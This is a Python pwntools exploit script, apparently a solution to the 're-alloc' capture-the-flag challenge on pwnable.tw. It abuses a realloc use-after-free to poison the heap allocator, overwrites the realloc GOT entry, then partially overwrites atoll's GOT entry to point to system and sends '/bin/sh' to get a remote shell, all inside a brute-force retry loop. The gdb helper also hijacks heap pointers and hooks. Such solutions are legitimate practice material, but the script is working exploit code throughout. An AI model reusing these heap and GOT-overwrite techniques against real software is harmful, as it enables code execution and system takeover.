#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib
import time

c = 0
pwn_file = "./re-alloc"
lib_file = './libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so'
ld_file = './ld-2.29.so'

elf = ELF(pwn_file)
lib = ELF(lib_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 'debug'
context.log_level = 100

debug = 0
if debug == 1:
    ld_str = "{} --library-path ./ {}".format(ld_file, pwn_file)
    print(ld_str.split())
    c = process(ld_str.split(), env={'LD_PRELOAD': lib_file})

    elf_path = c.cwd + c.argv[3].decode().strip('.')
    lib_path = c.cwd + lib_file.strip('.')

    sleep(0.1)
    print(c.libs())

    gdbcmd = '''
    file {} 
    set $elf={}
    set $lib={}
    set $heap_ptr= (long)0x4040b0
    
    define print-heap-addr
        tele $heap_ptr
    end
    
    define hijack-heap-ptr
        echo testing\\n
        tele $heap_ptr
        set *(long *)($heap_ptr-8)=0x20
        set *(long *)$heap_ptr=0x20
        set *(long *)($heap_ptr+8)=0x4040b0
        set *(long *)($heap_ptr+0x18)=0x20
        set *(long *)($heap_ptr+0x20)=0x20
        echo hijacked\\n
        tele $heap_ptr
    end
    
    define one-gadget-hooking
        set $realloc_hook=$lib+0x2e4c28
        set $memalign_hook=$lib+0x2e4c20
        set $malloc_hook=$lib+0x2e4c30
        tele $memalign_hook
    end

    c
    vmmap lib
    '''.format(pwn_file, hex(c.libs()[elf_path]), hex(c.libs()[lib_path]))

    gdb.attach(c, gdbcmd)


def alloc(index, size, data):
    c.sendlineafter('choice:', '1')
    c.sendlineafter('Index:', str(index))
    c.sendlineafter('Size:', str(size))
    c.sendafter('Data:', data)

def realloc(index, size, data, ignore_printf=False):
    c.sendlineafter('choice:', '2')
    c.sendlineafter('Index:', str(index))
    c.sendlineafter('Size:', str(size))
    c.sendafter('Data:', data)

def free(index):
    c.sendlineafter('choice:', '2')
    c.sendlineafter('Index:', str(index))
    c.sendlineafter('Size:', str(0))

def free_setnull(index):
    c.sendlineafter('choice:', '3')
    c.sendlineafter('Index:', str(index))

def exit():
    c.sendlineafter('choice:', '4')

system_byte = p64(lib.symbols['system']+0xc000)[0:2]
puts_gadget = p64(elf.plt['puts'])
ret_gadget = p64(0x401499)
#print(system_byte)

def exploit():
    global c
    c = remote('chall.pwnable.tw', '10106')

    alloc(0, 0x30, 'a' * 0x10)
    free(0)
    realloc(0, 0x40, p64(elf.got['realloc']))

    alloc(1, 0x30, 'b' * 0x10)
    realloc(1, 0x50, 'c' * 0x10)
    free_setnull(1)

    # got hijack write
    alloc(1, 0x30, p64(elf.symbols['read_long']))

    # wirte two byte of atoll
    c.sendlineafter('choice:', '2')
    c.sendlineafter('Index:', '1')
    c.sendafter('Size:', flat('2', filler='\0', length=0x10))
    c.sendline(str(elf.got['atoll']))
    print(hex(u16(system_byte)))
    c.sendafter('Data:', system_byte)

    # get shell
    c.sendlineafter('$', '2')
    c.sendafter('Index:', '/bin/sh\0')

    for i in range(10):
        c.sendline('echo sync')
        line = c.recvuntil('sync', timeout=1)
        if line == b'' and i > 5:
            print('qq')
            raise EOFError
        if i > 5:
            print(line)
            break

    c.interactive()
    c.close()

count = 0
while True:
    try:
        count += 1
        print('try exploit: ', count)
        exploit()
    except EOFError as error:
        print('failure')



